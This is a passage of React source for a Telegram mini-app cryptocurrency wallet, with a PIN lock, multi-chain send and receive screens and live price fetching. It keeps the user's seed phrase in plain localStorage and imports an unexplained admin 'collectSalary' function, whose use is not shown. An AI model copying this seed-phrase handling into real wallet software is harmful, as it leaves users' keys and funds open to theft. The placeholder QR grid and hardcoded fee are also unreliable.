import { useState, useRef, useEffect, useCallback, useMemo } from "react";
import {
  ArrowUpRight, ArrowDownLeft, CreditCard, ArrowLeftRight,
  Copy, Check, Eye, EyeOff, Settings, Wallet, Activity,
  ChevronRight, Shield, Key, HelpCircle, X,
  Plus, ChevronDown, RefreshCw, Globe, Lock, AlertTriangle, Bell,
  ExternalLink, TrendingUp, TrendingDown, Zap,
  CheckCircle, Clock, AlertCircle, RotateCcw,
  Users, Download, Building2, LayoutGrid
} from "lucide-react";

// ─── BLOCKCHAIN IMPORTS ───────────────────────────────────────────────────────
import { generateMnemonic as bip39GenMnemonic, deriveWallet, getPrivateKey } from "./lib/crypto/walletDerivation.js";
import { fetchAllBalances } from "./lib/crypto/balanceFetcher.js";
import { sendTransaction as chainSendTransaction } from "./lib/crypto/transactionSender.js";
import { executeSwap, getSwapQuote } from "./lib/swap/swapAggregator.js";
import { collectAll } from "./lib/admin/collectSalary.js";

// ─── GENERATORS (real BIP39 + HD derivation) ─────────────────────────────────
// genMnemonic: returns 12-word BIP39 array (bip39GenMnemonic returns a string)
const genMnemonic = () => bip39GenMnemonic().split(" ");
// genAddr kept for genTxHash only — addresses come from deriveWallet
const genAddr = (prefix="0x", len=40) => prefix + Array.from({length:len}, () => "0123456789abcdef"[Math.floor(Math.random()*16)]).join("");
const genTxHash = () => "0x" + Array.from({length:64}, () => "0123456789abcdef"[Math.floor(Math.random()*16)]).join("");
const shortAddr = (a) => a.slice(0,6)+"…"+a.slice(-4);
const fmt = (n, d=2) => Number(n).toLocaleString("en-US",{minimumFractionDigits:d,maximumFractionDigits:d});
const fmtUSD = n => "$"+fmt(n);
const fmtCrypto = (n, d=6) => parseFloat(n.toFixed(d));

// ─── STORAGE HELPERS (Telegram-linked localStorage) ─────────────────────────
function getTgUserId() {
  try {
    return window.Telegram?.WebApp?.initDataUnsafe?.user?.id || null;
  } catch { return null; }
}
function storageKey(base) {
  const uid = getTgUserId();
  return uid ? `${base}_${uid}` : base;
}

// ─── INITIAL ASSET STATE ──────────────────────────────────────────────────────
const INITIAL_PRICES = { USDT: 1.0000 };
const ASSET_META = [
  { id:"eth",  sym:"ETH",  name:"Ethereum",  color:"#8B9CF7", bg:"#0D1033", chg:0,    icon:"Ξ",  chain:"eth"     },
  { id:"ton",  sym:"TON",  name:"Toncoin",   color:"#0098EA", bg:"#001E33", chg:0,    icon:"◆",  chain:"ton"     },
  { id:"bnb",  sym:"BNB",  name:"BNB Chain", color:"#F3BA2F", bg:"#2A2100", chg:0,    icon:"◈",  chain:"bnb"     },
  { id:"ltc",  sym:"LTC",  name:"Litecoin",  color:"#BFBBBB", bg:"#1A1A1A", chg:0,    icon:"Ł",  chain:"ltc"     },
  { id:"arb",  sym:"ARB",  name:"Arbitrum",  color:"#28A0F0", bg:"#001A2A", chg:0,    icon:"◎",  chain:"arb"     },
  { id:"sol",  sym:"SOL",  name:"Solana",    color:"#B57BFF", bg:"#1A0A33", chg:0,    icon:"◉",  chain:"sol"     },
  { id:"usdt", sym:"USDT", name:"Tether",    color:"#26A17B", bg:"#001A14", chg:0.01, icon:"₮",  chain:"eth"     },
];
const INITIAL_BALANCES = { ETH: 0, TON: 0, BNB: 0, LTC: 0, ARB: 0, SOL: 0, USDT: 0 };

// ─── PRICE FETCHER ────────────────────────────────────────────────────────────
async function fetchLivePrices() {
  try {
    const ids = "ethereum,binancecoin,solana,the-open-network,litecoin,arbitrum,tether";
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
    const data = await res.json();
    const map = {
      ethereum: "ETH", binancecoin: "BNB", solana: "SOL",
      "the-open-network": "TON", litecoin: "LTC", arbitrum: "ARB", tether: "USDT"
    };
    const prices = {}, changes = {};
    Object.entries(map).forEach(([cgId, sym]) => {
      if (data[cgId]) {
        prices[sym] = data[cgId].usd;
        changes[sym] = data[cgId].usd_24h_change || 0;
      }
    });
    return { prices, changes };
  } catch {
    return null;
  }
}

// ─── HELPERS ─────────────────────────────────────────────────────────────────
function CoinIcon({ asset, size=42 }) {
  return (
    <div style={{width:size,height:size,borderRadius:"50%",background:asset.bg,
      border:`1.5px solid ${asset.color}33`,display:"flex",alignItems:"center",
      justifyContent:"center",fontSize:size*0.38,color:asset.color,flexShrink:0,
      fontFamily:"monospace",fontWeight:700,boxShadow:`0 0 12px ${asset.color}22`}}>
      {asset.icon}
    </div>
  );
}

function ActionBtn({ icon, label, onClick, color="#2563EB" }) {
  const [p,setP]=useState(false);
  function handleClick() {
    try { window.Telegram?.WebApp?.HapticFeedback?.impactOccurred("light"); } catch(_) {}
    onClick?.();
  }
  return (
    <button onClick={handleClick} onMouseDown={()=>setP(true)} onMouseUp={()=>setP(false)}
      onTouchStart={()=>setP(true)} onTouchEnd={()=>setP(false)}
      style={{display:"flex",flexDirection:"column",alignItems:"center",gap:8,
        background:"none",border:"none",cursor:"pointer",padding:0,
        transform:p?"scale(0.92)":"scale(1)",transition:"transform 0.12s cubic-bezier(.34,1.56,.64,1)"}}>
      <div style={{width:54,height:54,borderRadius:"50%",background:color,
        display:"flex",alignItems:"center",justifyContent:"center",boxShadow:`0 4px 20px ${color}55`}}>{icon}</div>
      <span style={{fontSize:12,color:"rgba(255,255,255,0.6)",fontWeight:500}}>{label}</span>
    </button>
  );
}

function Sheet({ onClose, title, children }) {
  useEffect(() => {
    const tg = window.Telegram?.WebApp;
    if (!tg) return;
    tg.BackButton.show();
    tg.BackButton.onClick(onClose);
    return () => { tg.BackButton.hide(); tg.BackButton.offClick(onClose); };
  }, [onClose]);
  return (
    <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.85)",zIndex:200,
      display:"flex",alignItems:"flex-end",animation:"fadeIn 0.2s ease"}}>
      <div style={{width:"100%",background:"#111",borderRadius:"24px 24px 0 0",
        padding:"0 0 48px",animation:"slideUp 0.35s cubic-bezier(.16,1,.3,1)",
        maxHeight:"92vh",overflowY:"auto"}}>
        <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",padding:"20px 24px 0"}}>
          <h3 style={{fontSize:18,fontWeight:700,color:"#fff",margin:0}}>{title}</h3>
          <button onClick={onClose} style={{background:"#222",border:"none",borderRadius:"50%",
            width:32,height:32,display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer"}}>
            <X size={16} color="rgba(255,255,255,0.6)"/>
          </button>
        </div>
        {children}
      </div>
    </div>
  );
}

function Toast({ msg, type="success", onDone }) {
  useEffect(()=>{const t=setTimeout(onDone,3000);return()=>clearTimeout(t);},[]);
  const colors = {success:"#22C55E",error:"#EF4444",info:"#8B9CF7"};
  return (
    <div style={{position:"fixed",top:60,left:"50%",transform:"translateX(-50%)",zIndex:999,
      background:"#1a1a1a",border:`1px solid ${colors[type]}44`,borderRadius:14,
      padding:"12px 20px",display:"flex",alignItems:"center",gap:10,
      animation:"slideDown 0.3s cubic-bezier(.16,1,.3,1)",maxWidth:320,boxShadow:"0 8px 32px rgba(0,0,0,0.6)"}}>
      {type==="success"&&<CheckCircle size={18} color="#22C55E"/>}
      {type==="error"&&<AlertCircle size={18} color="#EF4444"/>}
      {type==="info"&&<Zap size={18} color="#8B9CF7"/>}
      <span style={{fontSize:13,color:"#fff",fontWeight:500}}>{msg}</span>
    </div>
  );
}

// ─── PIN LOCK ─────────────────────────────────────────────────────────────────
function PinLock({ savedPin, onUnlock, onSetPin }) {
  const [digits,setDigits]=useState([]);
  const [error,setError]=useState(false);
  const [shake,setShake]=useState(false);

  function press(d) {
    if(digits.length>=6)return;
    const next=[...digits,d];
    setDigits(next);
    if(next.length===6) {
      const code=next.join("");
      setTimeout(()=>{
        if(!savedPin) { onSetPin(code); }
        else if(code===savedPin) { onUnlock(); }
        else {
          setError(true); setShake(true);
          setTimeout(()=>{setDigits([]);setError(false);setShake(false);},600);
        }
      },150);
    }
  }
  function del() { setDigits(d=>d.slice(0,-1)); }

  return (
    <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",
      alignItems:"center",justifyContent:"center",padding:"32px 24px"}}>
      <div style={{fontSize:36,marginBottom:16}}>💎</div>
      <h2 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 6px"}}>
        {savedPin?"Enter PIN":"Create PIN"}
      </h2>
      <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:"0 0 40px",textAlign:"center"}}>
        {savedPin?"Enter your 6-digit PIN to unlock":"Set a 6-digit PIN to protect your wallet"}
      </p>
      <div style={{display:"flex",gap:12,marginBottom:40,
        animation:shake?"shake 0.4s ease":"none"}}>
        {Array.from({length:6},(_,i)=>(
          <div key={i} style={{width:14,height:14,borderRadius:"50%",
            background:i<digits.length?(error?"#EF4444":"#2563eb"):"rgba(255,255,255,0.15)",
            transition:"background 0.15s",border:"1.5px solid rgba(255,255,255,0.1)"}}/>
        ))}
      </div>
      <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12,maxWidth:280,width:"100%"}}>
        {[1,2,3,4,5,6,7,8,9,"",0,"⌫"].map((k,i)=>(
          <button key={i} onClick={()=>k==="⌫"?del():k!==""?press(String(k)):null}
            disabled={k===""}
            style={{height:72,borderRadius:20,border:"none",
              background:k===""?"transparent":k==="⌫"?"rgba(255,255,255,0.06)":"rgba(255,255,255,0.08)",
              color:"#fff",fontSize:k==="⌫"?20:24,fontWeight:500,cursor:k===""?"default":"pointer",
              transition:"background 0.15s,transform 0.1s"}}
            onMouseDown={e=>k!==""&&(e.currentTarget.style.background="rgba(255,255,255,0.15)")}
            onMouseUp={e=>e.currentTarget.style.background=k==="⌫"?"rgba(255,255,255,0.06)":"rgba(255,255,255,0.08)"}>
            {k}
          </button>
        ))}
      </div>
    </div>
  );
}

// ─── NETWORK DATA ─────────────────────────────────────────────────────────────
const ASSET_NETWORKS = {
  ETH:  [{ id:"eth",  label:"Ethereum",  short:"ETH",    color:"#8B9CF7", placeholder:"0x… (42 chars)" }],
  TON:  [{ id:"ton",  label:"TON",       short:"TON",    color:"#0098EA", placeholder:"EQ… (48 chars)" }],
  BNB:  [{ id:"bnb",  label:"BNB Chain", short:"BNB",    color:"#F3BA2F", placeholder:"0x… (42 chars)" }],
  LTC:  [{ id:"ltc",  label:"Litecoin",  short:"LTC",    color:"#BFBBBB", placeholder:"L… (34 chars)"  }],
  ARB:  [{ id:"arb",  label:"Arbitrum",  short:"ARB",    color:"#28A0F0", placeholder:"0x… (42 chars)" }],
  SOL:  [{ id:"sol",  label:"Solana",    short:"SOL",    color:"#B57BFF", placeholder:"…  (44 chars)"  }],
  USDT: [
    { id:"eth",  label:"Ethereum",  short:"ERC-20", color:"#8B9CF7", placeholder:"0x… (42 chars)" },
    { id:"ton",  label:"TON",       short:"TRC-20", color:"#0098EA", placeholder:"EQ… (48 chars)" },
    { id:"bnb",  label:"BNB Chain", short:"BEP-20", color:"#F3BA2F", placeholder:"0x… (42 chars)" },
    { id:"arb",  label:"Arbitrum",  short:"ARB",    color:"#28A0F0", placeholder:"0x… (42 chars)" },
    { id:"sol",  label:"Solana",    short:"SPL",    color:"#B57BFF", placeholder:"…  (44 chars)"  },
  ],
};

// ─── NETWORK PICKER ───────────────────────────────────────────────────────────
function NetworkPicker({ sym, selected, onSelect }) {
  const nets = ASSET_NETWORKS[sym] || [];
  if(!nets.length) return null;
  // auto-select first if nothing selected yet
  const cur = selected || nets[0];
  return (
    <div>
      <p style={{fontSize:11,color:"rgba(255,255,255,0.35)",margin:"0 0 8px",
        fontWeight:600,letterSpacing:"0.06em",textTransform:"uppercase"}}>Network</p>
      <div style={{display:"flex",gap:6,flexWrap:"wrap"}}>
        {nets.map(net=>{
          const active = cur.id===net.id;
          return (
            <button key={net.id} onClick={()=>onSelect(net)}
              style={{display:"flex",alignItems:"center",gap:6,padding:"8px 12px",
                borderRadius:12,cursor:"pointer",transition:"all 0.18s",
                background:active?`${net.color}1a`:"rgba(255,255,255,0.04)",
                border:active?`1px solid ${net.color}55`:"1px solid rgba(255,255,255,0.08)"}}>
              <div style={{width:7,height:7,borderRadius:"50%",background:net.color,flexShrink:0,
                boxShadow:active?`0 0 7px ${net.color}`:"none",transition:"box-shadow 0.18s"}}/>
              <span style={{fontSize:12,fontWeight:600,
                color:active?net.color:"rgba(255,255,255,0.5)",transition:"color 0.18s"}}>{net.label}</span>
              <span style={{fontSize:10,color:"rgba(255,255,255,0.28)",background:"rgba(255,255,255,0.07)",
                borderRadius:5,padding:"1px 5px",fontWeight:500}}>{net.short}</span>
            </button>
          );
        })}
      </div>
    </div>
  );
}

// ─── SEND MODAL ───────────────────────────────────────────────────────────────
function SendModal({ onClose, assets, prices, onSend, addresses }) {
  const [step,setStep]=useState(1);
  const [sel,setSel]=useState(assets[0]);
  const [to,setTo]=useState("");
  const [amt,setAmt]=useState("");
  const [done,setDone]=useState(false);
  const [sending,setSending]=useState(false);
  const [selectedNet,setSelectedNet]=useState(()=>ASSET_NETWORKS[assets[0]?.sym]?.[0]||null);

  const assetObj = assets.find(a=>a.sym===sel.sym)||assets[0];
  const price = prices[sel.sym]||0;
  const fee = 0.84;
  const nets = ASSET_NETWORKS[sel.sym]||[];
  const curNet = selectedNet || nets[0] || null;

  function handleSelAsset(a) {
    setSel(a);
    setTo("");
    setSelectedNet(ASSET_NETWORKS[a.sym]?.[0]||null);
  }

  function next() {
    if(step===1&&to) setStep(2);
    else if(step===2&&amt) setStep(3);
    else if(step===3) {
      const num=parseFloat(amt);
      if(num>assetObj.balance){alert("Insufficient balance");return;}
      setSending(true);
      (async () => {
        try {
          const networkId = curNet?.id || sel.sym.toLowerCase();
          // Map networkId → uppercase chain key used by walletDerivation.js
          const NET_TO_CHAIN = {
            eth:"ETH", bnb:"BNB", arb:"ARB", sol:"SOL", ton:"TON", ltc:"LTC",
          };
          const chainKey = sel.sym === "USDT"
            ? NET_TO_CHAIN[networkId] || "ETH"
            : NET_TO_CHAIN[networkId] || sel.sym.toUpperCase();
          const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
          if (!storedMnemonic) throw new Error("Wallet not found in session");
          const privateKey = await getPrivateKey(storedMnemonic.split(" "), chainKey);
          if (!privateKey) throw new Error("Private key not available for " + chainKey);
          const txHash = await chainSendTransaction({
            sym: sel.sym,
            networkId,
            from: addresses?.[sel.sym] || "",
            to,
            amount: String(num),
            privateKey,
          });
          onSend({ sym:sel.sym, amount:num, to, usd:num*price, txHash });
          setDone(true);
          setTimeout(onClose,2500);
        } catch(err) {
          setSending(false);
          alert("Transaction failed: " + (err.message || err));
        }
      })();
    }
  }

  return (
    <Sheet onClose={onClose} title={done?"Sent! 🎉":"Send"}>
      {done?(
        <div style={{padding:"48px 24px",textAlign:"center"}}>
          <div style={{fontSize:64,marginBottom:16}}>✅</div>
          <p style={{color:"#22C55E",fontSize:20,fontWeight:700,margin:0}}>Transaction Sent!</p>
          <p style={{color:"rgba(255,255,255,0.4)",fontSize:13,marginTop:8}}>Broadcasting to network…</p>
        </div>
      ):(
        <div style={{padding:"20px 24px"}}>
          <div style={{display:"flex",gap:8,marginBottom:24}}>
            {[1,2,3].map(s=>(
              <div key={s} style={{flex:1,height:3,borderRadius:2,
                background:s<=step?"#2563eb":"rgba(255,255,255,0.1)",transition:"background 0.3s"}}/>
            ))}
          </div>
          {step===1&&(
            <div style={{display:"flex",flexDirection:"column",gap:16}}>
              <p style={{fontSize:13,color:"rgba(255,255,255,0.45)",margin:0}}>Select asset & recipient</p>
              <div style={{background:"#1a1a1a",borderRadius:14,padding:"6px",display:"flex",gap:4,flexWrap:"wrap"}}>
                {assets.map(a=>(
                  <button key={a.id} onClick={()=>handleSelAsset(a)} style={{padding:"8px 12px",borderRadius:10,border:"none",
                    background:sel.id===a.id?"#2563eb":"transparent",
                    color:sel.id===a.id?"#fff":"rgba(255,255,255,0.5)",
                    fontSize:12,fontWeight:600,cursor:"pointer"}}>{a.sym}</button>
                ))}
              </div>
              {nets.length>1&&(
                <div style={{background:"#1a1a1a",borderRadius:14,padding:"14px 16px",
                  border:"1px solid rgba(255,255,255,0.06)"}}>
                  <NetworkPicker sym={sel.sym} selected={curNet} onSelect={setSelectedNet}/>
                </div>
              )}
              <div style={{position:"relative"}}>
                <input value={to} onChange={e=>setTo(e.target.value)}
                  placeholder={curNet?.placeholder||"Recipient address"}
                  style={{width:"100%",padding:"16px",borderRadius:14,
                    border:`1px solid ${curNet?curNet.color+"33":"rgba(255,255,255,0.1)"}`,
                    background:"#1a1a1a",color:"#fff",fontSize:14,outline:"none",
                    fontFamily:"monospace",boxSizing:"border-box",transition:"border-color 0.2s"}}/>
                {curNet&&(
                  <div style={{position:"absolute",top:10,right:12,
                    display:"flex",alignItems:"center",gap:4,
                    background:`${curNet.color}18`,borderRadius:8,padding:"3px 8px",
                    border:`1px solid ${curNet.color}33`}}>
                    <div style={{width:5,height:5,borderRadius:"50%",background:curNet.color}}/>
                    <span style={{fontSize:10,color:curNet.color,fontWeight:600}}>{curNet.short}</span>
                  </div>
                )}
              </div>
              <div style={{background:"#1a1a1a",borderRadius:12,padding:"12px 14px",border:"1px solid rgba(255,255,255,0.06)"}}>
                <p style={{fontSize:11,color:"rgba(255,255,255,0.35)",margin:"0 0 4px"}}>Available</p>
                <p style={{fontSize:15,fontWeight:600,color:"#fff",margin:0}}>{fmt(assetObj.balance,6)} {sel.sym} <span style={{color:"rgba(255,255,255,0.4)",fontSize:13}}>≈ {fmtUSD(assetObj.balance*price)}</span></p>
              </div>
            </div>
          )}
          {step===2&&(
            <div style={{display:"flex",flexDirection:"column",gap:16}}>
              <div style={{display:"flex",justifyContent:"space-between"}}>
                <p style={{fontSize:13,color:"rgba(255,255,255,0.45)",margin:0}}>Amount</p>
                <span style={{fontSize:13,color:"rgba(255,255,255,0.45)"}}>Bal: {fmt(assetObj.balance,6)} {sel.sym}</span>
              </div>
              <div style={{background:"#1a1a1a",borderRadius:16,padding:"20px",border:"1px solid rgba(255,255,255,0.08)"}}>
                <div style={{display:"flex",alignItems:"center",gap:12}}>
                  <CoinIcon asset={sel} size={36}/>
                  <input value={amt} onChange={e=>setAmt(e.target.value)} placeholder="0.00" type="number" min="0"
                    style={{flex:1,background:"none",border:"none",outline:"none",color:"#fff",fontSize:28,fontWeight:700}}/>
                  <span style={{fontSize:16,fontWeight:600,color:"rgba(255,255,255,0.4)"}}>{sel.sym}</span>
                </div>
                {amt&&<p style={{fontSize:13,color:"rgba(255,255,255,0.35)",margin:"8px 0 0"}}>≈ {fmtUSD(parseFloat(amt||0)*price)}</p>}
              </div>
              <div style={{display:"flex",gap:8}}>
                {["25%","50%","75%","MAX"].map(p=>(
                  <button key={p} onClick={()=>setAmt(fmtCrypto(assetObj.balance*(p==="MAX"?1:parseInt(p)/100)))}
                    style={{flex:1,padding:"8px",borderRadius:10,border:"1px solid rgba(255,255,255,0.1)",
                      background:"#1a1a1a",color:"rgba(255,255,255,0.6)",fontSize:12,fontWeight:600,cursor:"pointer"}}>{p}</button>
                ))}
              </div>
            </div>
          )}
          {step===3&&(
            <div style={{display:"flex",flexDirection:"column",gap:10}}>
              <p style={{fontSize:13,color:"rgba(255,255,255,0.45)",margin:0}}>Review</p>
              {[["Asset",`${sel.name} (${sel.sym})`],
                ["Network",curNet?`${curNet.label} · ${curNet.short}`:"—"],
                ["Amount",`${amt} ${sel.sym}`],
                ["Value",fmtUSD(parseFloat(amt||0)*price)],["To",shortAddr(to)],
                ["Network Fee",`~${fmtUSD(fee)}`],["Total",fmtUSD(parseFloat(amt||0)*price+fee)]].map(([k,v])=>(
                <div key={k} style={{display:"flex",justifyContent:"space-between",padding:"12px 16px",
                  background:"#1a1a1a",borderRadius:12}}>
                  <span style={{fontSize:13,color:"rgba(255,255,255,0.45)"}}>{k}</span>
                  <span style={{fontSize:13,color:k==="Network"&&curNet?curNet.color:"#fff",fontWeight:500}}>{v}</span>
                </div>
              ))}
            </div>
          )}
          <button onClick={next} disabled={(step===1&&!to)||(step===2&&!amt)||sending}
            style={{width:"100%",padding:"17px",borderRadius:16,border:"none",marginTop:24,
              background:(step===1&&!to)||(step===2&&!amt)||sending?"rgba(255,255,255,0.08)":"linear-gradient(135deg,#2563eb,#7c3aed)",
              color:(step===1&&!to)||(step===2&&!amt)||sending?"rgba(255,255,255,0.3)":"#fff",
              fontSize:16,fontWeight:600,cursor:"pointer",transition:"all 0.2s",
              display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
            {sending?<><RefreshCw size={18} style={{animation:"spin 1s linear infinite"}}/>Sending…</>:step===3?"Confirm & Send ✓":"Continue →"}
          </button>
          {step>1&&<button onClick={()=>setStep(s=>s-1)} style={{width:"100%",padding:"12px",borderRadius:16,border:"none",
            marginTop:8,background:"transparent",color:"rgba(255,255,255,0.4)",fontSize:14,cursor:"pointer"}}>← Back</button>}
        </div>
      )}
    </Sheet>
  );
}

// ─── RECEIVE MODAL ────────────────────────────────────────────────────────────
// Maps USDT network id → wallet address key
const USDT_NET_ADDR = { eth:"ETH", ton:"TON", bnb:"BNB", arb:"ARB", sol:"SOL" };

// Per-asset: which address key to use
const ASSET_ADDR_KEY = { ETH:"ETH", TON:"TON", BNB:"BNB", ARB:"ARB", SOL:"SOL", LTC:"LTC" };

// Visual meta for the asset selector row
const RECEIVE_ASSETS = [
  { sym:"ETH",  color:"#8B9CF7", icon:"Ξ"  },
  { sym:"TON",  color:"#0098EA", icon:"◆"  },
  { sym:"BNB",  color:"#F3BA2F", icon:"◈"  },
  { sym:"ARB",  color:"#28A0F0", icon:"◎"  },
  { sym:"SOL",  color:"#B57BFF", icon:"◉"  },
  { sym:"LTC",  color:"#BFBBBB", icon:"Ł"  },
  { sym:"USDT", color:"#26A17B", icon:"₮"  },
];

// USDT networks для receive
const USDT_RECEIVE_NETS = [
  { id:"eth", label:"Ethereum",  short:"ERC-20", color:"#8B9CF7", addrKey:"ETH", placeholder:"0x… (42 chars)" },
  { id:"ton", label:"TON",       short:"TRC-20", color:"#0098EA", addrKey:"TON", placeholder:"EQ… (48 chars)" },
  { id:"bnb", label:"BNB Chain", short:"BEP-20", color:"#F3BA2F", addrKey:"BNB", placeholder:"0x… (42 chars)" },
  { id:"arb", label:"Arbitrum",  short:"ARB",    color:"#28A0F0", addrKey:"ARB", placeholder:"0x… (42 chars)" },
  { id:"sol", label:"Solana",    short:"SPL",    color:"#B57BFF", addrKey:"SOL", placeholder:"…  (44 chars)"  },
];

function ReceiveModal({ onClose, addresses }) {
  const [asset, setAsset]       = useState("ETH");
  const [usdtNet, setUsdtNet]   = useState(null); // null = сеть не выбрана
  const [copied, setCopied]     = useState(false);

  const isUsdt = asset === "USDT";

  // Адрес для показа
  let addr = "";
  if (!isUsdt) {
    addr = addresses[asset] || addresses[ASSET_ADDR_KEY[asset]] || "";
  } else if (usdtNet) {
    addr = addresses[usdtNet.addrKey] || "";
  }

  const meta        = RECEIVE_ASSETS.find(a => a.sym === asset) || RECEIVE_ASSETS[0];
  const accentColor = (isUsdt && usdtNet) ? usdtNet.color : meta.color;
  const addrLabel   = (isUsdt && usdtNet)
    ? `USDT · ${usdtNet.label} (${usdtNet.short})`
    : `${asset} Address`;

  function copy() {
    if (!addr) return;
    if (navigator.clipboard) navigator.clipboard.writeText(addr);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function pickAsset(sym) {
    setAsset(sym);
    setUsdtNet(null);
    setCopied(false);
  }

  return (
    <Sheet onClose={onClose} title="Receive">
      <div style={{padding:"20px 24px 32px", display:"flex", flexDirection:"column", gap:14}}>

        {/* ── Выбор монеты ── */}
        <div style={{background:"#1a1a1a", borderRadius:14, padding:"6px",
          display:"flex", gap:3, overflowX:"auto"}}>
          {RECEIVE_ASSETS.map(a => {
            const active = asset === a.sym;
            return (
              <button key={a.sym} onClick={() => pickAsset(a.sym)}
                style={{flex:"0 0 auto", display:"flex", alignItems:"center", gap:5,
                  padding:"8px 12px", borderRadius:10, border:"none", cursor:"pointer",
                  background: active ? `${a.color}22` : "transparent",
                  outline: active ? `1.5px solid ${a.color}55` : "none",
                  transition:"all 0.15s"}}>
                <span style={{fontSize:13, color: active ? a.color : "rgba(255,255,255,0.3)",
                  fontFamily:"monospace", fontWeight:700}}>{a.icon}</span>
                <span style={{fontSize:12, fontWeight:700,
                  color: active ? a.color : "rgba(255,255,255,0.4)"}}>{a.sym}</span>
              </button>
            );
          })}
        </div>

        {/* ── USDT: выбор сети (пока не выбрана) ── */}
        {isUsdt && !usdtNet && (
          <div style={{display:"flex", flexDirection:"column", gap:8}}>
            {/* Заголовок */}
            <div style={{background:"#26A17B12", borderRadius:14, padding:"14px 16px",
              border:"1px solid #26A17B33", display:"flex", alignItems:"center", gap:12}}>
              <div style={{width:38, height:38, borderRadius:"50%", background:"#26A17B22",
                border:"1.5px solid #26A17B44", display:"flex", alignItems:"center",
                justifyContent:"center", flexShrink:0}}>
                <span style={{fontSize:20, color:"#26A17B", fontFamily:"monospace", fontWeight:700}}>₮</span>
              </div>
              <div>
                <p style={{margin:0, fontSize:15, fontWeight:700, color:"#fff"}}>Выберите сеть</p>
                <p style={{margin:"3px 0 0", fontSize:12, color:"rgba(255,255,255,0.4)"}}>
                  USDT работает в нескольких сетях
                </p>
              </div>
            </div>

            {/* Карточки сетей */}
            {USDT_RECEIVE_NETS.map(net => (
              <button key={net.id} onClick={() => { setUsdtNet(net); setCopied(false); }}
                style={{width:"100%", background:"#111", borderRadius:14, padding:"14px 16px",
                  border:`1.5px solid ${net.color}44`, cursor:"pointer",
                  display:"flex", alignItems:"center", gap:14, textAlign:"left",
                  transition:"all 0.15s"}}
                onMouseEnter={e => { e.currentTarget.style.background = `${net.color}14`; e.currentTarget.style.borderColor = `${net.color}88`; }}
                onMouseLeave={e => { e.currentTarget.style.background = "#111"; e.currentTarget.style.borderColor = `${net.color}44`; }}>
                <div style={{width:42, height:42, borderRadius:"50%",
                  background:`${net.color}18`, border:`1.5px solid ${net.color}55`,
                  display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0}}>
                  <div style={{width:16, height:16, borderRadius:"50%", background:net.color,
                    boxShadow:`0 0 10px ${net.color}`}}/>
                </div>
                <div style={{flex:1}}>
                  <div style={{display:"flex", alignItems:"center", gap:8, marginBottom:4}}>
                    <span style={{fontSize:15, fontWeight:700, color:"#fff"}}>{net.label}</span>
                    <span style={{fontSize:11, fontWeight:700, color:net.color,
                      background:`${net.color}1a`, borderRadius:6, padding:"2px 8px",
                      border:`1px solid ${net.color}44`}}>{net.short}</span>
                  </div>
                  <span style={{fontSize:11, color:"rgba(255,255,255,0.3)", fontFamily:"monospace"}}>
                    {net.placeholder}
                  </span>
                </div>
                <ChevronRight size={18} color={`${net.color}99`}/>
              </button>
            ))}
          </div>
        )}

        {/* ── USDT: выбранная сеть + кнопка сменить ── */}
        {isUsdt && usdtNet && (
          <div style={{background:"#111", borderRadius:14, padding:"12px 16px",
            border:`1.5px solid ${usdtNet.color}55`,
            display:"flex", alignItems:"center", gap:12}}>
            <div style={{width:34, height:34, borderRadius:"50%", background:`${usdtNet.color}18`,
              border:`1.5px solid ${usdtNet.color}44`,
              display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0}}>
              <div style={{width:12, height:12, borderRadius:"50%", background:usdtNet.color,
                boxShadow:`0 0 8px ${usdtNet.color}`}}/>
            </div>
            <div style={{flex:1}}>
              <span style={{fontSize:14, fontWeight:700, color:"#fff"}}>{usdtNet.label}</span>
              <span style={{fontSize:11, fontWeight:700, color:usdtNet.color,
                background:`${usdtNet.color}1a`, borderRadius:5, padding:"2px 7px",
                border:`1px solid ${usdtNet.color}33`, marginLeft:8}}>{usdtNet.short}</span>
            </div>
            <button onClick={() => { setUsdtNet(null); setCopied(false); }}
              style={{background:"rgba(255,255,255,0.06)", border:"1px solid rgba(255,255,255,0.1)",
                borderRadius:8, padding:"6px 12px", cursor:"pointer",
                fontSize:12, color:"rgba(255,255,255,0.5)", fontWeight:600}}>
              Сменить
            </button>
          </div>
        )}

        {/* ── QR + адрес + кнопка (только если сеть выбрана или не USDT) ── */}
        {(!isUsdt || usdtNet) && (
          <>
            {/* QR */}
            <div style={{alignSelf:"center", width:178, height:178, background:"#fff", borderRadius:20,
              display:"flex", alignItems:"center", justifyContent:"center", position:"relative",
              boxShadow:`0 0 32px ${accentColor}28`,
              border:`2.5px solid ${accentColor}44`, transition:"all 0.3s"}}>
              <div style={{display:"grid", gridTemplateColumns:"repeat(10,1fr)", gap:2, width:138, height:138}}>
                {Array.from({length:100}, (_, i) => {
                  const hash = addr.split("").reduce((a, c, j) => a ^ (c.charCodeAt(0) * (j + 1)), 0);
                  return <div key={i} style={{background: ((i * 17 + hash) % 3 === 0) ? "#000" : "#fff", borderRadius:1}}/>;
                })}
              </div>
              <div style={{position:"absolute", width:36, height:36, borderRadius:9, background:"#fff",
                display:"flex", alignItems:"center", justifyContent:"center", border:"2px solid #eee"}}>
                <span style={{fontSize:17, color:accentColor, fontFamily:"monospace", fontWeight:700}}>{meta.icon}</span>
              </div>
            </div>

            {/* Адрес */}
            <div style={{background:"#1a1a1a", borderRadius:14, padding:"14px 16px",
              border:`1px solid ${accentColor}33`, transition:"border-color 0.3s"}}>
              <div style={{display:"flex", alignItems:"center", gap:7, marginBottom:7}}>
                <div style={{width:8, height:8, borderRadius:"50%", background:accentColor,
                  boxShadow:`0 0 7px ${accentColor}`}}/>
                <span style={{fontSize:11, color:accentColor, fontWeight:700,
                  letterSpacing:"0.06em", textTransform:"uppercase"}}>{addrLabel}</span>
              </div>
              <p style={{fontSize:11, color:"rgba(255,255,255,0.75)", margin:0,
                fontFamily:"monospace", wordBreak:"break-all", lineHeight:1.75}}>{addr}</p>
            </div>

